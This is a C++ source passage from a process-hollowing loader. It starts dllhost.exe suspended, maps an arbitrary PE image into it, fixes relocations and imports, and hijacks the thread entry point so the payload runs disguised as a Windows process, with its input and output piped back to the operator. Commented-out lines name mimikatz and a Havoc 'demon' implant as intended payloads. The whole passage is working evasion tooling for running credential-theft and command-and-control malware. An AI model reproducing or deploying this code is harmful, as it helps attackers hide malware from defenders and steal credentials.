	status = myNtWrite(pi->hProcess, (LPVOID)(CTX.Rdx + 0x10), &myPE->ntHeader->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (status != 0)
	{
		_dbg("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Rcx = (DWORD64)myPE->ntHeader->OptionalHeader.ImageBase + myPE->ntHeader->OptionalHeader.AddressOfEntryPoint;

	status = myNtSetContextThread(pi->hThread, &CTX);
	if (status != 0)
	{
		_dbg("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	status = myNtResumeThread(pi->hThread, nullptr);
	if (status != 0)
	{
		_err("Error in resuming thread: %x \r\n", status);
		return FALSE;
	}
	return TRUE;
}

BOOL retrieveOutPut(PIO outStruct)
{
	DWORD timeout = 100;
	PVOID commandOutput = nullptr;
	DWORD bytesSize = 0;
	//NTSTATUS status = myNtWaitForSingleObject(hThread, FALSE, PLARGE_INTEGER(&timeout));
	while (WaitForSingleObject(outStruct->hThread, 100) != WAIT_OBJECT_0) {
		readPipe(outStruct->hStd, &commandOutput, &bytesSize);
		if (bytesSize > 0)
		{
			printf("%s\r\n", commandOutput);
			DATA_FREE(commandOutput, bytesSize);
		}
	}
	// Reading output one last time to check we don't leave anything behind...
	readPipe(outStruct->hStd, &commandOutput, &bytesSize);
	if (bytesSize > 0)
	{
		printf("%s\r\n", commandOutput);
	}
	return TRUE;
}

VOID writeNamedPipe(PIO input)
{
	while (WaitForSingleObject(input->hThread, 100) != WAIT_OBJECT_0) 
	{
		char buffer[200];
		scanf_s("%s", buffer, 198);
		strcat_s(buffer,200 ,"\n");
		DWORD byteWritten = 0;
		if (!WriteFile(input->hStd, buffer, strlen(buffer), &byteWritten, NULL))
		{
			printf("%x", GetLastError());
			exit(1);
		}
	}
}

int main(int argc, char** argv)
{

	// create destination process - this is the process to be hollowed out
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();

	LPCSTR peInject = argv[1];
	//PCHAR args = argv[2];
	//LPCSTR peInject = "C:\\Users\\user\\Downloads\\demon.x64.exe";
	//LPCSTR args = "\"coffee\" \"exit\"";
	//LPCSTR peInject = "C:\\Users\\user\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe";
	LPCSTR target = "C:\\Windows\\System32\\dllhost.exe";

	LPVOID peToInjectContent = NULL;

	HANDLE hStdOut = nullptr;
	HANDLE hStdIn = nullptr;

	if (!loadPEFromDisk(peInject, peToInjectContent))
		exit(1);

	PPE_STRUCT myPE = createPEStrcut(peToInjectContent);
	if (!myPE)
	{
		_err("Error in parsing PE\r\n");
		exit(1);
	}
		

	if (!launchSuspendedProcess((LPSTR)target, pi, hStdOut, hStdIn))
		exit(1);

	LPVOID allocAddrOnTarget = NULL;
	SIZE_T sizeAlloc = myPE->ntHeader->OptionalHeader.SizeOfImage;
	NTSTATUS status = myNtAlloc(pi->hProcess, &allocAddrOnTarget, NULL, &sizeAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != 0)
	{
		_err("Error in allocation %x\r\n", status);
		exit(1);
	}
	DWORD64 DeltaImageBase = (DWORD64)allocAddrOnTarget - myPE->ntHeader->OptionalHeader.ImageBase;

	if (allocAddrOnTarget == NULL)
	{
		_dbg("[-] ERROR: Failed to allocate memory on target process\r\n");
		exit(1);
	}

	_dbg("[+] Memory allocate at : 0x%p\n", allocAddrOnTarget);


	if (!copyPEinTargetProcess(pi->hProcess, allocAddrOnTarget, myPE))
		exit(1);

	if (!fixRelocTable(pi->hProcess, myPE, allocAddrOnTarget, DeltaImageBase))
		exit(1);

	if (!loadImportTableLibs(myPE, pi->hProcess, allocAddrOnTarget))
		exit(1);

	if (!loadDelayedImportTableLibs(myPE, pi->hProcess, allocAddrOnTarget))
		exit(1);

	HANDLE mod = getSnapShotProcess(pi->dwProcessId);

	if (!fixImports(myPE, pi->hProcess, allocAddrOnTarget, mod))
		exit(1);

	if (!fixDelayedImports(myPE, pi->hProcess, allocAddrOnTarget, mod))
		exit(1);

	CloseHandle(mod);

	if (!FixMemPermissionsEx(pi->hProcess, (ULONG_PTR)allocAddrOnTarget, myPE->ntHeader, myPE->sections[0].header))
		exit(1);

	if (!overwriteEntryPointAndResumeThread(pi, myPE))
		exit(1);

	DWORD bytesSize = 0;
	DWORD threadID = 0;
	IO outPut = { 0 };
	outPut.hStd = hStdOut;
	outPut.hThread = pi->hThread;
	IO inPut = { 0 };
	inPut.hStd = hStdIn;
	inPut.hThread = pi->hThread;

	//retrieveOutPut(&test);
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)retrieveOutPut, &outPut, 0, &threadID);
	writeNamedPipe(&inPut);

	return 0;
}
